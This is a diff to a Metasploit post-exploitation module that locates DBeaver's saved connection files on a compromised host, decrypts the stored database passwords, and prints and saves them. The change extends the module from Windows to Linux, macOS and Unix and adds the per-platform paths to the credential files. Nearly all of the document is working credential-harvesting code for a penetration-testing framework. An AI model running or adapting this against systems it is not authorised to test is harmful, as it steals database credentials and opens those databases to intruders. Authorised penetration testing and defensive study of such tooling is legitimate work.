@@ -1,22 +1,17 @@
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
-#
-# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
-# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb
 ##
 
 class MetasploitModule < Msf::Post
-  include Msf::Post::Windows::Registry
   include Msf::Post::File
-  include Msf::Post::Windows::UserProfiles
   include Rex::Parser::Dbeaver
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => 'Windows Gather Dbeaver Passwords',
+        'Name' => 'Gather Dbeaver Passwords',
         'Description' => %q{
           This module will determine if Dbeaver is installed on the target system and, if it is, it will try to
           dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
@@ -27,8 +22,8 @@ class MetasploitModule < Msf::Post
           [ 'URL', 'https://blog.kali-team.cn/Metasploit-dbeaver-9f42e26241c94ba785dce5f1e69697aa' ]
         ],
         'Author' => ['Kali-Team <kali-team[at]qq.com>'],
-        'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ],
+        'Platform' => [ 'linux', 'win', 'osx', 'unix'],
+        'SessionTypes' => [ 'meterpreter', 'shell', 'powershell' ],
         'Notes' => {
           'Stability' => [],
           'Reliability' => [],
@@ -125,8 +120,8 @@ class MetasploitModule < Msf::Post
         some_result << parse_data_sources(data_sources_data, credentials_config_data)
         print_status("Finished processing #{json_dir}")
       end
-    rescue ::JSON::ParserError
-      print_error("The file #{json_dir} either could not be read or does not exist")
+    rescue Rex::Parser::Dbeaver::Error::ParserError => e
+      print_error("Error when parsing #{file}: #{e.class} - #{e}")
     end
     return some_result
   end
@@ -145,14 +140,40 @@ class MetasploitModule < Msf::Post
         end
         print_status("Finished processing #{fullpath}")
       end
-    rescue Rex::Post::Meterpreter::RequestError
+    rescue StandardError
       print_error("The file #{fullpath} either could not be read or does not exist")
     end
     return some_result
   end
 
+  def get_path
+    path_hash = Hash.new
+    xml_paths = []
+    case session.platform
+    when 'windows'
+      app_data = get_env('AppData')
+      if !app_data.blank?
+        xml_paths.push(app_data + '\DBeaverData\workspace6\General\.dbeaver-data-sources.xml')
+        path_hash['json'] = app_data + '\DBeaverData\workspace6\General\.dbeaver'
+      end
+      home = get_env('USERPROFILE')
+      if !home.blank?
+        xml_paths.push(home + '\.dbeaver4\General\.dbeaver-data-sources.xml')
+      end
+    when 'linux', 'osx', 'unix'
+      home = get_env('HOME')
+      if !home.blank?
+        xml_paths.push(home + '/.dbeaver4/General/.dbeaver-data-sources.xml')
+        xml_paths.push(home + '/.local/share/DBeaverData/workspace6/General/.dbeaver-data-sources.xml')
+        path_hash['json'] = home + '/.local/share/DBeaverData/workspace6/General/.dbeaver'
+      end
+    end
+    path_hash['xml'] = xml_paths
+    return path_hash
+  end
+
   def run
-    profiles = grab_user_profiles
+    print_status("Gather Dbeaver Passwords on #{sysinfo['Computer']}")
     all_result = []
     xml_path = ''
     json_path = ''
@@ -167,13 +188,19 @@ class MetasploitModule < Msf::Post
       all_result += parse_json_dir(json_path)
     end
     if xml_path.empty? && json_path.empty?
-      profiles.each do |user_profiles|
-        next if user_profiles['SID'].nil?
-
-        print_status("Gather Dbeaver Passwords on #{user_profiles['UserName']}")
-        all_result += parse_xml_file(user_profiles['ProfileDir'] + '\.dbeaver4\General\.dbeaver-data-sources.xml')
-        all_result += parse_xml_file(user_profiles['AppData'] + '\DBeaverData\workspace6\General\.dbeaver-data-sources.xml')
-        all_result += parse_json_dir(user_profiles['AppData'] + '\DBeaverData\workspace6\General\.dbeaver')
+      path_hash = get_path
+      xml_paths = path_hash['xml'] || []
+      xml_paths.each do |path|
+        result = parse_xml_file(path)
+        if !result.empty?
+          all_result += result
+        end
+      end
+      if !path_hash['json'].blank?
+        result = parse_json_dir(path_hash['json'])
+        if !result.empty?
+          all_result += result
+        end
       end
     end
     print_and_save(all_result)
